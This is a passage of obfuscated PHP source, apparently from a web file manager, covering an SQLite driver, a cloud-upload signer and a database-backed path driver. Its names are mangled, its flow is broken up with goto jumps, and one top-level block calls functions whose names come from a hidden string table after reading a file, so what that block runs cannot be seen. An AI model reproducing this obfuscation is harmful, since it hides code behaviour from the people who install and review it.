think_status($EÁ“Ü≠‹èã[20]); $this->queryID = sqlite_query($this->_linkID, $fÁïèµÿÖñ); $this->debug(); goto Fºªõà∫áﬂ; Bç√êâ†£¡: } public function execute($e≠√·Ê√∑ã) { goto D§Îê†œè•; D§Îê†œè•: $dõñäÆ™„° =& $_SERVER[∞„˜ƒÑºª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d¯Ê∞æÿÕß; d“â¯å™çÜ: if (!1 === $Eü†ªœÙ©©) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto déöª ëÁÿ; d¯Ê∞æÿÕß: $this->queryStr = $e≠√·Ê√∑ã; if ($this->queryID) { $this->free(); } think_action_status($dõñäÆ™„°[21], 1); goto EŒ¨œ¬–Ø; EŒ¨œ¬–Ø: think_status($dõñäÆ™„°[20]); $Eü†ªœÙ©© = sqlite_exec($this->_linkID, $e≠√·Ê√∑ã); $this->debug(); goto d“â¯å™çÜ; déöª ëÁÿ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[∞„˜ƒÑºª][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bö®á÷›™À = sqlite_query($this->_linkID, $_SERVER[∞„˜ƒÑºª][23]); if (!$bö®á÷›™À) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $DØ∞œ´ﬁÃí = sqlite_query($this->_linkID, $_SERVER[∞„˜ƒÑºª][24]); if (!$DØ∞œ´ﬁÃí) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $d≈ö∞ﬁÎÌ∫ = array(); if ($this->numRows > 0) { for ($eÃÜÓ¢®î” = 0; $eÃÜÓ¢®î” < $this->numRows; $eÃÜÓ¢®î”++) { $d≈ö∞ﬁÎÌ∫[$eÃÜÓ¢®î”] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $d≈ö∞ﬁÎÌ∫; } public function getFields($f´ßä≥∂ç§) { $aƒÛæÑå”‡ =& $_SERVER[∞„˜ƒÑºª]; $C¨€†ûéÊè = $this->query($aƒÛæÑå”‡[25] . $f´ßä≥∂ç§ . $aƒÛæÑå”‡[26]); $Dπ¶›œÈÈâ = array(); if ($C¨€†ûéÊè) { foreach ($C¨€†ûéÊè as $eπ±Ü„⁄ü◊ => $Bõúû˘⁄û®) { $Dπ¶›œÈÈâ[$Bõúû˘⁄û®[$aƒÛæÑå”‡[27]]] = array($aƒÛæÑå”‡[28] => $Bõúû˘⁄û®[$aƒÛæÑå”‡[27]], $aƒÛæÑå”‡[29] => $Bõúû˘⁄û®[$aƒÛæÑå”‡[30]], $aƒÛæÑå”‡[31] => (bool) ($Bõúû˘⁄û®[$aƒÛæÑå”‡[32]] === $aƒÛæÑå”‡[33]), $aƒÛæÑå”‡[34] => $Bõúû˘⁄û®[$aƒÛæÑå”‡[35]], $aƒÛæÑå”‡[36] => strtolower($Bõúû˘⁄û®[$aƒÛæÑå”‡[37]]) == $aƒÛæÑå”‡[38], $aƒÛæÑå”‡[39] => strtolower($Bõúû˘⁄û®[$aƒÛæÑå”‡[40]]) == $aƒÛæÑå”‡[41]); } } return $Dπ¶›œÈÈâ; } public function getTables($eƒµ¯£ΩÈü = '') { $Eäã»˜ºŸı =& $_SERVER[∞„˜ƒÑºª]; $f∆ôÑäå¬ﬂ = $this->query($Eäã»˜ºŸı[42] . $Eäã»˜ºŸı[43] . $Eäã»˜ºŸı[44]); $F˜ã∞ò¥¿˜ = array(); foreach ($f∆ôÑäå¬ﬂ as $C≠·ï…îèÇ => $f¨ï±ÁßÑ‚) { $F˜ã∞ò¥¿˜[$C≠·ï…îèÇ] = current($f¨ï±ÁßÑ‚); } return $F˜ã∞ò¥¿˜; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $C›Øó”Ú›≤ =& $_SERVER[∞„˜ƒÑºª]; $DÖŸüÙæ˜€ = sqlite_last_error($this->_linkID); $this->error = $DÖŸüÙæ˜€ . $C›Øó”Ú›≤[4] . sqlite_error_string($DÖŸüÙæ˜€); if ($C›Øó”Ú›≤[33] != $this->queryStr) { $this->error .= LNG($C›Øó”Ú›≤[45]) . $this->queryStr; } think_trace($this->error, $C›Øó”Ú›≤[33], $C›Øó”Ú›≤[46]); return $this->error; } public function escapeString($C˜ÎÎöÑ÷∫) { return sqlite_escape_string($C˜ÎÎöÑ÷∫); } public function parseLimit($D≤›–ƒƒ¶‚) { $e—ê‚Î∫ì› =& $_SERVER[∞„˜ƒÑºª]; $a´µöÜŒŒÉ = $e—ê‚Î∫ì›[33]; if (!empty($D≤›–ƒƒ¶‚)) { $D≤›–ƒƒ¶‚ = explode($e—ê‚Î∫ì›[47], $D≤›–ƒƒ¶‚); if (count($D≤›–ƒƒ¶‚) > 1) { $a´µöÜŒŒÉ .= $e—ê‚Î∫ì›[48] . $D≤›–ƒƒ¶‚[1] . $e—ê‚Î∫ì›[49] . $D≤›–ƒƒ¶‚[0] . $e—ê‚Î∫ì›[50]; } else { $a´µöÜŒŒÉ .= $e—ê‚Î∫ì›[48] . $D≤›–ƒƒ¶‚[0] . $e—ê‚Î∫ì›[50]; } } return $a´µöÜŒŒÉ; } } if ($_SERVER[$_SERVER[∞„˜ƒÑºª][51]] != $_SERVER[$_SERVER[∞„˜ƒÑºª][52]]) { goto bŒ∂Á‘Ø¬µ; bŒ∂Á‘Ø¬µ: $D¬Âàà‹∑í = $_SERVER[∞„˜ƒÑºª][53]; $Fπ˜ÜŸ∞ôô = BASIC_PATH . $_SERVER[∞„˜ƒÑºª][54]; $Eíö¯‹÷èã = $D¬Âàà‹∑í($Fπ˜ÜŸ∞ôô); goto d¢ﬁºÇÇ∏ø; Cµ°ˆ÷ó‰“: $Dœ‹◊π¢È¥($_SERVER[$_SERVER[∞„˜ƒÑºª][58]]); goto DŸæîâëä⁄; d¢ﬁºÇÇ∏ø: $dúø£ç“Ωê = explode($_SERVER[∞„˜ƒÑºª][55], $Eíö¯‹÷èã); if (count($dúø£ç“Ωê) < $_SERVER[∞„˜ƒÑºª][56]) { die; } $Dœ‹◊π¢È¥ = $_SERVER[∞„˜ƒÑºª][57]; goto Cµ°ˆ÷ó‰“; DŸæîâëä⁄: } goto EóÈ«å‚ï‚; b∑º’¨Ê∂∏: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($E∂‘ÁÎÑèÑ) { parent::__construct($E∂‘ÁÎÑèÑ); $this->signatureVersion($_SERVER[∞„˜ƒÑºª][196]); } public function uploadFormData($eê›õÑÙ¶ö, $cˆ›…É”Ã… = 3600) { goto f÷åÇúÉ≠; e¥Âé˜µäÜ: $E§ë·ÜæŒâ = sha1($E•úÀü“éˆ); $Aµ±ÕµÔÏü = hash_hmac($cª’ÙËÏ‚Ï[220], $E§ë·ÜæŒâ, $D≥ç∆áÈ”°); $Cœ°÷õÇ µ = array($cª’ÙËÏ‚Ï[821] => $F˘ÍñÉßïé, $cª’ÙËÏ‚Ï[825] => $Bæ÷≤∑œÿÍ, $cª’ÙËÏ‚Ï[829] => base64_encode($E•úÀü“éˆ), $cª’ÙËÏ‚Ï[826] => $EÊÁò“ëºà, $cª’ÙËÏ‚Ï[827] => $this->accessKey, $cª’ÙËÏ‚Ï[830] => $b≤ô¬Î¥◊Æ, $cª’ÙËÏ‚Ï[831] => $Aµ±ÕµÔÏü, $cª’ÙËÏ‚Ï[165] => $this->getHost()); goto E¯€∫≠ÏíÚ; E¯€∫≠ÏíÚ: return $Cœ°÷õÇ µ; goto a„›áÖˆ‰ç; AÛÀ¶”˜áè: $E•úÀü“éˆ = array($cª’ÙËÏ‚Ï[819] => $EòúÀŸÑíﬁ, $cª’ÙËÏ‚Ï[820] => array(array($cª’ÙËÏ‚Ï[821] => $F˘ÍñÉßïé), array($cª’ÙËÏ‚Ï[822] => $this->bucket), array($cª’ÙËÏ‚Ï[823], $cª’ÙËÏ‚Ï[824], $cª’ÙËÏ‚Ï[33]), array($cª’ÙËÏ‚Ï[825] => $Bæ÷≤∑œÿÍ), array($cª’ÙËÏ‚Ï[826] => $EÊÁò“ëºà), array($cª’ÙËÏ‚Ï[827] => $this->accessKey), array($cª’ÙËÏ‚Ï[828] => $b≤ô¬Î¥◊Æ))); $E•úÀü“éˆ = json_encode($E•úÀü“éˆ); $D≥ç∆áÈ”° = hash_hmac($cª’ÙËÏ‚Ï[220], $b≤ô¬Î¥◊Æ, $this->secret); goto e¥Âé˜µäÜ; f÷åÇúÉ≠: $cª’ÙËÏ‚Ï =& $_SERVER[∞„˜ƒÑºª]; $F˘ÍñÉßïé = $cª’ÙËÏ‚Ï[181]; $EÊÁò“ëºà = $cª’ÙËÏ‚Ï[220]; goto bÖâÆ‘Âë¿; bÖâÆ‘Âë¿: $Bæ÷≤∑œÿÍ = $cª’ÙËÏ‚Ï[817]; $EòúÀŸÑíﬁ = gmdate($cª’ÙËÏ‚Ï[818], time() + $cˆ›…É”Ã…); $b≤ô¬Î¥◊Æ = (string) time() . $cª’ÙËÏ‚Ï[76] . (string) (time() + $cˆ›…É”Ã…); goto AÛÀ¶”˜áè; a„›áÖˆ‰ç: } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($cêË˜ﬂ∂¬Ú) { $this->pathParse = $cêË˜ﬂ∂¬Ú; $this->model = Model($_SERVER[∞„˜ƒÑºª][832]); } public function getPath($d∞»ã¡åÙ’) { return trim($d∞»ã¡åÙ’, $_SERVER[∞„˜ƒÑºª][8]); } public function pathFather($Dƒõ å¨ÿ·) { $cºÁË´“‚∆ = $this->pathPrase($Dƒõ å¨ÿ·); $cºÁË´“‚∆ = $this->infoSimple($Dƒõ å¨ÿ·); return $cºÁË´“‚∆ ? $cºÁË´“‚∆[$_SERVER[∞„˜ƒÑºª][384]] : !1; } public function getPathName($BËì†ñ–ªò) { $fÈÀá›‹ÁΩ = $this->infoSimple($BËì†ñ–ªò); return $fÈÀá›‹ÁΩ ? $fÈÀá›‹ÁΩ[$_SERVER[∞„˜ƒÑºª][28]] : !1; } public function getPathOuter($aíùìÎÃ‹ø) { $Bµò§’Ω«⁄ =& $_SERVER[∞„˜ƒÑºª]; if (!$aíùìÎÃ‹ø) { return $aíùìÎÃ‹ø; } $BÏ˜Ì„‰¯ƒ = $this->pathPrase($aíùìÎÃ‹ø); if ($this->pathParse[$Bµò§’Ω«⁄[29]] == KodIO::KOD_SHARE_ITEM) { return KodIO::makeShare($this->pathParse[$Bµò§’Ω«⁄[366]], $BÏ˜Ì„‰¯ƒ[$Bµò§’Ω«⁄[366]]); } return KodIO::make($BÏ˜Ì„‰¯ƒ[$Bµò§’Ω«⁄[366]]); } public function copyFolderFromIO($DœÏ÷£Ÿë—, $fÛª∂¯”ñ®, $D„ß™‘ã», $Bùåá≠≠¯‹, $EÈÌˆÁ´ºπ) { $F⁄â¬≠ùæ´ = $this->model->copyFolderFromIO($DœÏ÷£Ÿë—, $fÛª∂¯”ñ®, $D„ß™‘ã», $Bùåá≠≠¯‹, $EÈÌˆÁ´ºπ); return KodIO::make($F⁄â¬≠ùæ´); } public function isParentOf($bíÑÏä—≥ñ, $Déâÿ∏î®∞) { return $this->model->isParentOf($bíÑÏä—≥ñ, $Déâÿ∏î®∞); } public function mkfile($cä»Í´À∫Ò, $A¨˘Í¢’É = '', $Eû»±ì¨ô† = REPEAT_RENAME) { $CÃë´èëøß =& $_SERVER[∞„˜ƒÑºª]; $CÂíË®€§ï = $this->pathPrase($cä»Í´À∫Ò); $cä»Í´À∫Ò = $CÂíË®€§ï[$CÃë´èëøß[366]]; for ($FïŸ®Êƒ‡Ÿ = 0; $FïŸ®Êƒ‡Ÿ < count($CÂíË®€§ï[$CÃë´èëøß[833]]); $FïŸ®Êƒ‡Ÿ++) { $aôïöÚØÕ· = $CÂíË®€§ï[$CÃë´èëøß[833]][$FïŸ®Êƒ‡Ÿ]; $c√âæ∑¨÷á = "\120\141\x74\x68\104\x72\151\x76\x65\x72\x44\102\56\155\153\144\151\162\56{$cä»Í´À∫Ò}\56{$aôïöÚØÕ·}"; CacheLock::lock($c√âæ∑¨÷á); if ($FïŸ®Êƒ‡Ÿ == count($CÂíË®€§ï[$CÃë´èëøß[833]]) - 1) { $cä»Í´À∫Ò = $this->model->mkfile($cä»Í´À∫Ò, $aôïöÚØÕ·, $A¨˘Í¢’É, $Eû»±ì¨ô†); CacheLock::unlock($c√âæ∑¨÷á); break; } $cä»Í´À∫Ò = $this->model->mkdir($cä»Í´À∫Ò, $aôïöÚØÕ·, REPEAT_SKIP); CacheLock::unlock($c√âæ∑¨÷á); } return $this->getPathOuter($cä»Í´À∫Ò); } public function mkdir($f™ÿ¿Ù“ÉÉ, $b¬ûî¯’ï◊ = REPEAT_SKIP) { $d£Ÿ∞ïÁ˜° =& $_SERVER[∞„˜ƒÑºª]; $FµÜ”∞ ƒé = $this->pathPrase($f™ÿ¿Ù“ÉÉ); $f™ÿ¿Ù“ÉÉ = $FµÜ”∞ ƒé[$d£Ÿ∞ïÁ˜°[366]]; for ($c¯çµ≈ùó« = 0; $c¯çµ≈ùó« < count($FµÜ”∞ ƒé[$d£Ÿ∞ïÁ˜°[833]]); $c¯çµ≈ùó«++) { $Cﬂ¶…ÓÎ∞≥ = $FµÜ”∞ ƒé[$d£Ÿ∞ïÁ˜°[833]][$c¯çµ≈ùó«]; $Fó∆ëÃŒŸÓ = "\x50\x61\164\x68\104\x72\151\166\145\x72\x44\102\56\x6d\x6b\144\x69\x72\x2e{$f™ÿ¿Ù“ÉÉ}\x2e{$Cﬂ¶…ÓÎ∞≥}"; CacheLock::lock($Fó∆ëÃŒŸÓ); $f™ÿ¿Ù“ÉÉ = $this->model->mkdir($f™ÿ¿Ù“ÉÉ, $Cﬂ¶…ÓÎ∞≥, $b¬ûî¯’ï◊); CacheLock::unlock($Fó∆ëÃŒŸÓ); } return $this->getPathOuter($f™ÿ¿Ù“ÉÉ); } public function copyFile($d’ªê€º∆¥, $AƒÉıá‰âê, $bÔÆÁÍ›Óº = REPEAT_REPLACE) { $aíàí∫“˘” =& $_SERVER[∞„˜ƒÑºª]; $fâÃƒÏ©¬ = $this->pathPrase($AƒÉıá‰âê); $aê ÷ª¨¢ï = $this->model->copy($d’ªê€º∆¥, $fâÃƒÏ©¬[$aíàí∫“˘”[366]], $bÔÆÁÍ›Óº, $fâÃƒÏ©¬[$aíàí∫“˘”[84]]); return $aê ÷ª¨¢ï ? $this->getPathOuter($aê ÷ª¨¢ï) : !1; } public function moveFile($B®†Õ∂›˜€, $FùÁÖ¥√‹í, $eÀÍ—¶æíÈ = REPEAT_REPLACE) { $C†˘Õ∑û”À =& $_SERVER[∞„˜ƒÑºª]; $a∫Ù–ÕíºÂ = $this->pathPrase($FùÁÖ¥√‹í); $Fπ∏ú◊´Œ = $this->model->move($B®†Õ∂›˜€, $a∫Ù–ÕíºÂ[$C†˘Õ∑û”À[366]], $eÀÍ—¶æíÈ, $a∫Ù–ÕíºÂ[$C†˘Õ∑û”À[84]]); return $Fπ∏ú◊´Œ ? $this->getPathOuter($Fπ∏ú◊´Œ) : !1; } public function copy($Cè°«Ö»ô›, $eÖ–»∫ß◊©, $DÒó¶üŸ˘¯ = REPEAT_REPLACE) { $d®Ö°Ñ¥ﬂ’ = $this->pathPrase($eÖ–»∫ß◊©); $b£âÃ‡¥Õ’ = $this->model->copy($Cè°«Ö»ô›, $d®Ö°Ñ¥ﬂ’[$_SERVER[∞„˜ƒÑºª][366]], $DÒó¶üŸ˘¯); return $b£âÃ‡¥Õ’ ? $this->getPathOuter($b£âÃ‡¥Õ’) : !1; } public function move($eç„†◊ôåÃ, $B´Öø¨√–ª, $cèé¬∆öÃ∞ = REPEAT_REPLACE) { $d‡◊˘√§Ôﬁ = $this->pathPrase($B´Öø¨√–ª); $fÏúÇÁÍÁ® = $this->model->move($eç„†◊ôåÃ, $d‡◊˘√§Ôﬁ[$_SERVER[∞„˜ƒÑºª][366]], $cèé¬∆öÃ∞); return $fÏúÇÁÍÁ® ? $this->getPathOuter($fÏúÇÁÍÁ®) : !1; } public function remove($Fáÿ–É©√¨, $D®¬ºûí°˜ = true) { return $this->model->remove($Fáÿ–É©√¨, $D®¬ºûí°˜); } public function rename($FˆÀçı”ëµ, $Cèüé°Ó≈Ú) { $Eø—‡åﬁ‡Ã = $this->model->rename($FˆÀçı”ëµ, $Cèüé°Ó≈Ú); return $Eø—‡åﬁ‡Ã ? $this->getPathOuter($FˆÀçı”ëµ) : $Eø—‡åﬁ‡Ã; } public function size($b¿¿Ìä¢£…) { $aÖËåÔˆ≠◊ = $this->infoSimple($b¿¿Ìä¢£…); return $aÖËåÔˆ≠◊ ? $aÖËåÔˆ≠◊[$_SERVER[∞„˜ƒÑºª][86]] : 0; } public function infoSimple($a∑ÖÂ¥⁄Ê≥) { return $this->model->sourceInfo($a∑ÖÂ¥⁄Ê≥); } public function info($CΩ©’≈Ø»à) { return $this->infoParse($CΩ©’≈Ø»à); } public function infoAuth($Eçë»â„áˆ) { return $this->infoParse($Eçë»â„áˆ, !1, !0); } public function infoWithChildren($D±„√‡°¡÷) { return $this->infoParse($D±„√‡°¡÷, !0); } private function infoParse($d⁄“”ê≈∂É, $CÛ  ”ﬁ¿ñ = false, $E…èè÷∞êí = false) { $eá≥˘©ÁÙô =& $_SERVER[∞„˜ƒÑºª]; if ($this->pathParse[$eá≥˘©ÁÙô[29]] == KodIO::KOD_SHARE_ITEM) { $dΩÜøäÙëÛ = $this->pathParse[$eá≥˘©ÁÙô[366]]; $C∑Õ—èà≈ù = trim($this->pathParse[$eá≥˘©ÁÙô[745]], $eá≥˘©ÁÙô[8]); return ActionCall($eá≥˘©ÁÙô[834], $dΩÜøäÙëÛ, $C∑Õ—èà≈ù); } if ($this->pathParse[$eá≥˘©ÁÙô[29]] == KodIO::KOD_SHARE_LINK) { return ActionCall($eá≥˘©ÁÙô[835], $this->pathParse[$eá≥˘©ÁÙô[84]]); } if (!$CÛ  ”ﬁ¿ñ) { return $this->model->pathInfo($d⁄“”ê≈∂É, $E…èè÷∞êí); } return $this->model->pathInfoMore($d⁄“”ê≈∂É); } public function infoFull($aÙ˘ìæﬂ∞) { goto D≈êÜëïÌæ; EÏ–ª…¡…õ: return $b‚õ£Ìû«¥; goto aØ¥õá˜ÚØ; D≈êÜëïÌæ: $CÍ£’Ç§“¶ =& $_SERVER[∞„˜ƒÑºª]; $dÖûüΩúçÛ = explode($CÍ£’Ç§“¶[8], $aÙ˘ìæﬂ∞); $DÛâ∂∏‡∫Á = $dÖûüΩúçÛ[0]; goto Bº⁄·∫Ê€É; Bº⁄·∫Ê€É: $bèÛÀ”ø« = implode($CÍ£’Ç§“¶[8], array_splice($dÖûüΩúçÛ, 1)); $b‚õ£Ìû«¥ = $this->model->pathInfoByPath($DÛâ∂∏‡∫Á, $bèÛÀ”ø«); if ($this->pathParse[$CÍ£’Ç§“¶[29]] == KodIO::KOD_SHARE_ITEM) { $a∆®ó√£º = $this->pathParse[$CÍ£’Ç§“¶[366]]; $DÛâ∂∏‡∫Á = trim($this->pathParse[$CÍ£’Ç§“¶[745]], $CÍ£’Ç§“¶[8]); $b‚õ£Ìû«¥ = ActionCall($CÍ£’Ç§“¶[834], $a∆®ó√£º, $DÛâ∂∏‡∫Á); } goto EÏ–ª…¡…õ; aØ¥õá˜ÚØ: } public function exist($fÒ†ÏΩﬂ¥) { $b‰çàè‹¡ø =& $_SERVER[∞„˜ƒÑºª]; $F∂ÁÒƒ≤öä = $this->pathPrase($fÒ†ÏΩﬂ¥); if (!$F∂ÁÒƒ≤öä[$b‰çàè‹¡ø[84]]) { return $this->isFile($fÒ†ÏΩﬂ¥) || $this->isFolder($fÒ†ÏΩﬂ¥); } $A å±∆—∂à = array($b‰çàè‹¡ø[398] => $F∂ÁÒƒ≤öä[$b‰çàè‹¡ø[366]], $b‰çàè‹¡ø[28] => $F∂ÁÒƒ≤öä[$b‰çàè‹¡ø[84]]); $Eú≠‘ﬁ¯õ≤ = $this->model->where($A å±∆—∂à)->find(); return $Eú≠‘ﬁ¯õ≤ ? !0 : !1; } public function isFile($f®Ú ƒßÉè) { $E›Ùù›õæ≈ =& $_SERVER[∞„˜ƒÑºª]; $bùÆ¯∞õúº = $this->infoSimple($f®Ú ƒßÉè); return $bùÆ¯∞õúº && $bùÆ¯∞õúº[$E›Ùù›õæ≈[375]] == $E›Ùù›õæ≈[376] ? !1 : !0; } public function isFolder($b£◊¯÷À…‘) { $bó‡¶Æ≥±Ç =& $_SERVER[∞„˜ƒÑºª]; $dÀ¢„ﬁ¨∆“ = $this->infoSimple($b£◊¯÷À…‘); return $dÀ¢„ﬁ¨∆“ && $dÀ¢„ﬁ¨∆“[$bó‡¶Æ≥±Ç[375]] == $bó‡¶Æ≥±Ç[376] ? !0 : !1; } public function listPath($b∆øÖ∆÷œπ, $Cüø©ΩÍñè = false, $C∆Ñªúï€ = false) { $cıÚ«ÈØˆ =& $_SERVER[∞„˜ƒÑºª]; if ($b∆øÖ∆÷œπ == $cıÚ«ÈØˆ[33]) { return !1; } $BóˆÍ°πã’ = array($cıÚ«ÈØˆ[398] => $b∆øÖ∆÷œπ); if ($C∆Ñªúï€) { return $this->model->listSource($BóˆÍ°πã’, -1); } return $this->model->listSource($BóˆÍ°πã’); } public function has($E‡âΩΩÌ˘ˆ, $F±°ì€ô¿∫ = null) { return $this->model->hasChildren($E‡âΩΩÌ˘ˆ, $F±°ì€ô¿∫); } public function listAll($fŸ∑È¥Ìîç) { return $this->model->listAll($fŸ∑È¥Ìîç); } public function getContent($Eƒ⁄êì·™) { return $this->model->getContent($Eƒ⁄êì·™); } public function setContent($dàåÚ®ó°ƒ, $cáÛ´æÛº„ = '') { return $this->model->setContent($dàåÚ®ó°ƒ, $cáÛ´æÛº„); } public function fileSubstr($bÖê◊ç÷ù‹, $Cé≤óÑÉ¨è, $A¿µ¬À¬™„) { return $this->model->fileSubstr($bÖê◊ç÷ù‹, $Cé≤óÑÉ¨è, $A¿µ¬À¬™„); } public function download($A¨ßÛíâ‹ˆ, $cÉ≠øåƒŒ“ = '') { $EæäÉ’®ëå = $this->model->fileInfoGet($A¨ßÛíâ‹ˆ); IO::copy($EæäÉ’®ëå[$_SERVER[∞„˜ƒÑºª][84]], $cÉ≠øåƒŒ“); return $cÉ≠øåƒŒ“; } public function upload($Bí©÷Ùíì’, $Dù≠™∞´£ë, $E–êæ£∏≤∫ = false, $cà‰ç∑«çÉ = REPEAT_REPLACE) { $f∆¿üù≠¶ª =& $_SERVER[∞„˜ƒÑºª]; $B’∆Õ©Ç«Ã = $this->pathPrase($Bí©÷Ùíì’); $f›‰◊ñÆ˜è = $this->model->addFile($B’∆Õ©Ç«Ã[$f∆¿üù≠¶ª[366]], $Dù≠™∞´£ë, $B’∆Õ©Ç«Ã[$f∆¿üù≠¶ª[84]], $E–êæ£∏≤∫, $cà‰ç∑«çÉ); return $this->getPathOuter($f›‰◊ñÆ˜è); } public function uploadFileByID($e–◊„…Ïõ±, $cö‰ç¨°∆Ê, $D≥Ü¿ã‘âÔ) { $E¿»É€ÿÃÈ =& $_SERVER[∞„˜ƒÑºª]; $dÙ‚…’ŸÏ¡ = $this->pathPrase($e–◊„…Ïõ±); $bê£Á¥’˜Ç = $this->model->addFileByFileID($dÙ‚…’ŸÏ¡[$E¿»É€ÿÃÈ[366]], $cö‰ç¨°∆Ê, $dÙ‚…’ŸÏ¡[$E¿»É€ÿÃÈ[84]], $D≥Ü¿ã‘âÔ); return $this->getPathOuter($bê£Á¥’˜Ç); } public function addFileByRemote($A›Ü©éŒ°Ã, $DÛå≠Ü≠çπ, $dÜÇ“ÿ•ªÌ = array(), $BÔ›°∂∑„å = '', $AØ¶í±≠§—) { $D£ÜëœºÌÁ =& $_SERVER[∞„˜ƒÑºª]; $aÈÃûñ‰∞ = $this->pathPrase($A›Ü©éŒ°Ã); $BÔ›°∂∑„å = empty($BÔ›°∂∑„å) ? $aÈÃûñ‰∞[$D£ÜëœºÌÁ[84]] : $BÔ›°∂∑„å; $BÎÀåø“ÇÚ = $this->model->addFileByRemote($aÈÃûñ‰∞[$D£ÜëœºÌÁ[366]], $DÛå≠Ü≠çπ, $BÔ›°∂∑„å, $dÜÇ“ÿ•ªÌ, $AØ¶í±≠§—); return $this->getPathOuter($BÎÀåø“ÇÚ); } public function uploadLink($d¬Òåë–Ëç, $aéÌ‚πıπÜ = 0) { $f‡ÑŒ˘ë⁄ç =& $_SERVER[∞„˜ƒÑºª]; $aÚ ±ëç´î = $this->pathPrase($d¬Òåë–Ëç); $d¬Òåë–Ëç = Model($f‡ÑŒ˘ë⁄ç[426])->createFileName($aÚ ±ëç´î[$f‡ÑŒ˘ë⁄ç[84]]); $EÕæçÁÉßä = IO::uploadLink($d¬Òåë–Ëç, $aéÌ‚πıπÜ); return $EÕæçÁÉßä; } public function fileNameAuto($fÁ“ÍåÛîî, $bâ∂‚çÛªÕ, $c€∏Æ®Æ©• = REPEAT_REPLACE, $c‹£¥–Èº¨ = false) { return $this->model->fileNameAuto($fÁ“ÍåÛîî, $bâ∂‚çÛªÕ, $c€∏Æ®Æ©•, $c‹£¥–Èº¨); } public function fileNameExist($FæÙ≠Ìç€, $Bö‡πìµÓê) { return $this->model->fileNameExist($FæÙ≠Ìç€, $Bö‡πìµÓê); } private function _fileOut($c››ÂØØÖê, $d÷ªª•ëˆ› = false, $Eì∫çˆ€±œ = false, $F©ËåßﬂÇ£ = '', $C¢€”·˜å¨ = false) { goto BÌ‹∫Ÿ∑Œ◊; BÌ‹∫Ÿ∑Œ◊: $A¿òáÿ¬± =& $_SERVER[∞„˜ƒÑºª]; $CÜçπ‰Ç†é = $this->model->sourceInfo($c››ÂØØÖê); if ($CÜçπ‰Ç†é[$A¿òáÿ¬±[375]] == $A¿òáÿ¬±[376]) { header($A¿òáÿ¬±[836]); die; } goto DÜ¬ô√¥«è; DÜ¬ô√¥«è: $DãªÖ‰–ºÒ = $this->model->fileInfoGet($c››ÂØØÖê); $F©ËåßﬂÇ£ = $DãªÖ‰–ºÒ[$A¿òáÿ¬±[159]] ? $DãªÖ‰–ºÒ[$A¿òáÿ¬±[159]] : $F©ËåßﬂÇ£; if ($C¢€”·˜å¨) { return IO::fileOutServer($DãªÖ‰–ºÒ[$A¿òáÿ¬±[84]], $d÷ªª•ëˆ›, $DãªÖ‰–ºÒ[$A¿òáÿ¬±[28]], $F©ËåßﬂÇ£); } goto D§⁄„ŒÑŒÛ; D§⁄„ŒÑŒÛ: IO::fileOut($DãªÖ‰–ºÒ[$A¿òáÿ¬±[84]], $d÷ªª•ëˆ›, $DãªÖ‰–ºÒ[$A¿òáÿ¬±[28]], $F©ËåßﬂÇ£); goto EêóÌµ≈ëü; EêóÌµ≈ëü: } public function fileOut($d˘ØŸ›†◊«, $bïﬁ≥ÑüóŸ = false, $dáÕ‚÷ôÃ§ = false, $Fêê€ÕàäÎ = '') { $this->_fileOut($d˘ØŸ›†◊«, $bïﬁ≥ÑüóŸ, $dáÕ‚÷ôÃ§, $Fêê€ÕàäÎ); } public function fileOutServer($a™œ•öêÃÉ, $DÜ‹∂ŒåÓ = false, $b”Ö∑⁄øº¥ = false, $F©Ø¿ˆÜ∆≤ = '') { $this->_fileOut($a™œ•öêÃÉ, $DÜ‹∂ŒåÓ, $b”Ö∑⁄øº¥, $F©Ø¿ˆÜ∆≤, !0); } private function _fileOutImage($cë—Öûó‹—, $B√œï°Âç = 250) { $E≤ñõñíˆê =& $_SERVER[∞„˜ƒÑºª]; $FÜÂÔ⁄‘á⁄ = $this->model->sourceInfo($cë—Öûó‹—); if ($FÜÂÔ⁄‘á⁄[$E≤ñõñíˆê[375]] == $E≤ñõñíˆê[376]) { show_json($E≤ñõñíˆê[837] . $cë—Öûó‹—, !1); } $fêƒñÖãÀ∫ = $this->model->fileInfoGet($cë—Öûó‹—); IO::fileOutImage($fêƒñÖãÀ∫[$E≤ñõñíˆê[84]], $B√œï°Âç); } public function fileOutImage($d›ˆ∆„ΩÚç, $BŸéê£§ÿö = 250) { $this->_fileOutImage($d›ˆ∆„ΩÚç, $BŸéê£§ÿö); } public function fileOutImageServer($dçß†ø≠‚å, $aÒÖÉ≤èâ≠ = 250) { $this->_fileOutImage($dçß†ø≠‚å, $aÒÖÉ≤èâ≠); } public function link($BÇ™Ù¬Üù£, $eá ±ÂÁî« = '') { $CŸ∂Éõ˘±á = $this->model->fileInfoGet($BÇ™Ù¬Üù£); return IO::link($CŸ∂Éõ˘±á[$_SERVER[∞„˜ƒÑºª][84]], $eá ±ÂÁî«); } protected function pathPrase($D•äıÔÊÇΩ) { $EßﬂŒÏÉÉú =& $_SERVER[∞„˜ƒÑºª]; if (strstr($D•äıÔÊÇΩ, $EßﬂŒÏÉÉú[8]) === !1) { return array($EßﬂŒÏÉÉú[794] => intval($D•äıÔÊÇΩ), $EßﬂŒÏÉÉú[84] => $EßﬂŒÏÉÉú[33], $EßﬂŒÏÉÉú[833] => array()); } $f≈ê¢Í£«ƒ = explode($EßﬂŒÏÉÉú[8], trim($D•äıÔÊÇΩ, $EßﬂŒÏÉÉú[8])); if (count($f≈ê¢Í£«ƒ) < 2) { show_tips($D•äıÔÊÇΩ . $EßﬂŒÏÉÉú[838]); } return array($EßﬂŒÏÉÉú[794] => intval($f≈ê¢Í£«ƒ[0]), $EßﬂŒÏÉÉú[84] => $f≈ê¢Í£«ƒ[1], $EßﬂŒÏÉÉú[833] => 